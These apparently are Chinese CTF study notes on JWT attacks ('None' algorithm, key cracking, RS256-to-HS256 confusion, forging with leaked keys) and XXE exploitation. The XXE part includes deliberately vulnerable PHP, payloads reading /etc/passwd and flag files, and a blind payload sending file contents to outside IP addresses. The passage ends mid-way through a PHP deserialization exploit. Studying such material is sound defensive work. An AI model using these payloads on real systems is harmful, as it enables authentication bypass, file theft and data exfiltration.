<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;alg&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;None&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;typ&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;jwt&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;user&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;Admin&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;alg&quot;</span><span class="punctuation">:</span><span class="string">&quot;None&quot;</span><span class="punctuation">,</span><span class="attr">&quot;typ&quot;</span><span class="punctuation">:</span><span class="string">&quot;JWT&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;iss&quot;</span><span class="punctuation">:</span><span class="string">&quot;admin&quot;</span><span class="punctuation">,</span><span class="attr">&quot;iat&quot;</span><span class="punctuation">:</span><span class="number">1673703091</span><span class="punctuation">,</span><span class="attr">&quot;exp&quot;</span><span class="punctuation">:</span><span class="number">1673710291</span><span class="punctuation">,</span><span class="attr">&quot;nbf&quot;</span><span class="punctuation">:</span><span class="number">1673703091</span><span class="punctuation">,</span><span class="attr">&quot;sub&quot;</span><span class="punctuation">:</span><span class="string">&quot;admin&quot;</span><span class="punctuation">,</span><span class="attr">&quot;jti&quot;</span><span class="punctuation">:</span><span class="string">&quot;21a3d6eec9efbc030983fbc3650c0f03&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">ewogICAgImFsZyIgOiAiTm9uZSIsCiAgICAidHlwIiA6ICJqd3QiCn0=.ewogICAgInVzZXIiIDogImFkbWluIgp9</span><br></pre></td></tr></table></figure>

<p>JWT 爆破工具地址<br><a target="_blank" rel="noopener" href="https://github.com/brendan-rius/c-jwt-cracker">https://github.com/brendan-rius/c-jwt-cracker</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker build . -t jwtcrack</span><br><span class="line">docker run -it --<span class="built_in">rm</span>  jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.cAOIAifu3fykvhkHpbuhbvtH807-Z2rI1FS3vX1XMjE</span><br></pre></td></tr></table></figure>

<h3 id="密钥混淆攻击"><a href="#密钥混淆攻击" class="headerlink" title="密钥混淆攻击"></a>密钥混淆攻击</h3><pre><code>JWT最常用的两种算法是HMAC和RSA。HMAC用同一个密钥对token进行签名和认证。而RSA需要两个密钥，先用私钥加密生成JWT，然后使用其对应的公钥来解密验证。那么，后端代码会使用公钥作为秘密密钥，然后使用HS256算法验证签名。由于公钥有时可以被攻击者获取到，所以攻击者可以修改header中算法为HS256，然后使用RSA公钥对数据进行签名。
 利用方式：jwt_tool(https://github.com/ticarpi/jwt_tool)
 用法：python3 jwt_tool.py token_here -pk pubkey -T -S hs256
</code></pre>
<p>密钥爆破&#x2F;泄露<br>    HMAC签名密钥（例如HS256 &#x2F; HS384 &#x2F; HS512）使用对称加密，这意味着对令牌进行签名的密钥也用于对其进行验证。由于签名验证是一个自包含的过程，因此可以测试令牌本身的有效密钥，而不必将其发送回应用程序进行验证。<br>    因此，jwtcrack破解是JWT破解工具，可以通过穷举的方式暴力破解密钥。<br>    如果可以破解HMAC密钥，则可以伪造令牌中的任何内容，这个漏洞将会给系统带来非常严重的后果，所以在加密时不要使用弱密钥进行加密。<br>    jwtcrack(<a target="_blank" rel="noopener" href="https://github.com/brendan-rius/c-jwt-cracker">https://github.com/brendan-rius/c-jwt-cracker</a>)<br>    用法：.&#x2F;jwtcrack token_here</p>
<p>node安装jwt命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install jsonwebtoken</span><br></pre></td></tr></table></figure>

<h3 id="私钥泄露"><a href="#私钥泄露" class="headerlink" title="私钥泄露"></a>私钥泄露</h3><p>可以根据私钥生成任意的jwt字符串</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">&#x27;jsonwebtoken&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> privateKey = fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;private.key&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> token = jwt.<span class="title function_">sign</span>(&#123; <span class="attr">user</span>: <span class="string">&#x27;admin&#x27;</span> &#125;, privateKey, &#123; <span class="attr">algorithm</span>: <span class="string">&#x27;RS256&#x27;</span> &#125;);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(token)</span><br></pre></td></tr></table></figure>

<p>验签</p>
<h3 id="公钥泄露"><a href="#公钥泄露" class="headerlink" title="公钥泄露"></a>公钥泄露</h3><p>可以根据公钥，修改算法从非对称算法 到 对称密钥算法  </p>
<p>双方都使用公钥验签，顺利篡改数据</p>
<p>当公钥可以拿到时，如果使用对称密码，则对面使用相同的公钥进行解密</p>
<p>实现验签通过</p>
<h3 id="总结加密方式"><a href="#总结加密方式" class="headerlink" title="总结加密方式"></a>总结加密方式</h3><p>1 非对称加密算法  私钥  公钥   只要两个时匹配 一个私钥加密的文件，用公钥都能解开(验签)</p>
<p>2 对称加密算法   暗号  口令  公钥 </p>
<h3 id="总结jwt攻击"><a href="#总结jwt攻击" class="headerlink" title="总结jwt攻击"></a>总结jwt攻击</h3><p>1 空密码算法绕过 不验证算法的前提下</p>
<p>2 弱密码绕过   猜测弱密码</p>
<p>3 密码爆破   安装docker 执行jwtcracker</p>
<p>4 私钥泄露  直接利用私钥生成正确jwt字符串 过验签</p>
<p>5 公钥泄露  不验证算法前提下，修改算法为对称加密，通过公钥重新生成对称签名的字符串 实现验签通过</p>
<p>&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p>
<h1 id="XXE的利用"><a href="#XXE的利用" class="headerlink" title="XXE的利用"></a>XXE的利用</h1><p>受到影响的类和函数<br><code>SimpleXMLElement</code>、&#96;DOM</p>
<p>Document<code>、</code>simplexml_load_string&#96;<br>(libxml&lt;2.9.0, PHP 5, PHP 7)<br>libxml2.9.0以后，默认不解析外部实体，导致XXE漏洞逐渐消亡。为了演示PHP环境下的XXE漏洞<br>XML Entity 实体注入<br>当程序处理xml文件时，没有禁止对外部实体的处理，容易造成xxe漏洞<br>危害<br>主流是任意文件读取<br>Content-Type: text&#x2F;xml</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);	<span class="comment">//默认情况下，libxml_disable_entity_loader 是启用的，它禁用外部实体的加载。这里，它被设置为 false，意味着允许外部实体的加载。这可能带来安全风险，因为它可能允许 XXE (XML External Entity) 攻击</span></span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<span class="comment">//LIBXML_NOENT 会将实体替换为它们的值，而 LIBXML_DTDLOAD 会加载外部 DTD。</span></span><br><span class="line">    <span class="variable">$creds</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$creds</span>-&gt;ctfshow; <span class="comment">//从 SimpleXMLElement 对象中提取名为 &quot;ctfshow&quot; 的元素。</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$ctfshow</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p>XML 文件<br>一般表示带有结构的数据<br>祖父  3个叔父  8个堂弟堂妹   </p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">祖父</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">叔父1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">堂兄1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">叔父1</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">叔父2</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">堂兄2</span>&gt;</span>    </span><br><span class="line">    <span class="tag">&lt;/<span class="name">叔父2</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">叔父3</span>&gt;</span></span><br><span class="line"></span><br><span class="line">     <span class="tag">&lt;<span class="name">堂兄3</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">叔父4</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">祖父</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE&gt;</span> 声明定义了整个文档的类型，<span class="meta">&lt;!ENTITY&gt;</span> 声明定义了一个实体。</span><br><span class="line">xml格式</span><br><span class="line">1 有回显时文件读取方法</span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">hacker</span>[</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">hacker</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ctfshow</span>&gt;</span></span><br><span class="line">        <span class="symbol">&amp;hacker;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ctfshow</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line"></span><br><span class="line">php://filter/read=convert.base64-encode/resource=/flag</span><br></pre></td></tr></table></figure>

<p>2 无回显时文件读取方法</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">hacker</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">myurl</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://47.236.120.83/test.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %myurl;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">1</span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>test.dtd内容</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % dtd &quot;&lt;!ENTITY &amp;#x25; vps SYSTEM &#x27;http://43.154.107.226:3389/%file;&#x27;&gt; &quot;&gt;</span><br><span class="line">%dtd;</span><br><span class="line">%vps;</span><br></pre></td></tr></table></figure>

<h3 id="报错xxe"><a href="#报错xxe" class="headerlink" title="报错xxe"></a>报错xxe</h3><ul>
<li>libxml&lt;&#x3D;2.8(2.9以后默认不使用外部实体)</li>
<li>开启了报错</li>
<li>无回显</li>
</ul>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">message</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY % a <span class="string">&#x27;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">		&lt;!ENTITY &amp;#x25; b &quot;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">			&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">			&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">		&quot;&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">	&#x27;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%a;</span></span><br><span class="line"><span class="meta">%b;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span>asfddasfd<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>或</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">message</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">condition</span> <span class="string">&#x27;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">        &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">        &amp;#x25;eval;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">        &amp;#x25;error;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">&#x27;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %condition;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span>any text<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="xxePhar"><a href="#xxePhar" class="headerlink" title="xxePhar"></a>xxePhar</h3><p>弱口令<code>admin/admin</code>登录，会跳转到一个文件上传的点。可以先使用<code>XXE</code>逐一读取<code>doLogin.php</code>和<code>class.php</code>的文件内容</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#doLogin.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* autor: c0ny1</span></span><br><span class="line"><span class="comment">* date: 2018-2-7</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;class.php&quot;</span>);</span><br><span class="line"><span class="variable">$USERNAME</span> = <span class="string">&#x27;admin&#x27;</span>; <span class="comment">//账号</span></span><br><span class="line"><span class="variable">$PASSWORD</span> = <span class="string">&#x27;admin&#x27;</span>; <span class="comment">//密码</span></span><br><span class="line"><span class="variable">$result</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">	<span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">	<span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">	<span class="variable">$creds</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);</span><br><span class="line"></span><br><span class="line">	<span class="variable">$username</span> = <span class="variable">$creds</span>-&gt;username;</span><br><span class="line">	<span class="variable">$password</span> = <span class="variable">$creds</span>-&gt;password;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$username</span> == <span class="variable">$USERNAME</span> &amp;&amp; <span class="variable">$password</span> == <span class="variable">$PASSWORD</span>)&#123;</span><br><span class="line">		<span class="variable">$result</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">1</span>,<span class="variable">$username</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$result</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">0</span>,<span class="variable">$username</span>);</span><br><span class="line">	&#125;	</span><br><span class="line">&#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;</span><br><span class="line">	<span class="variable">$result</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">3</span>,<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#class.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fun</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$func</span> = <span class="string">&#x27;call_user_func_array&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;func,<span class="variable">$f</span>,<span class="variable">$p</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">getenv</span>(<span class="string">&quot;FLAG&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;serialize me?&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/Test/&quot;</span>,<span class="title function_ invoke__">get_class</span>(<span class="variable">$this</span>-&gt;a)))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;No test in Prod\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;a-&gt;<span class="variable">$p</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$p</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a-&gt;<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>构造序列化内容，exp如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fun</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$func</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;func = <span class="keyword">array</span>(<span class="keyword">new</span> <span class="title class_">Test</span>,<span class="string">&quot;__call&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span 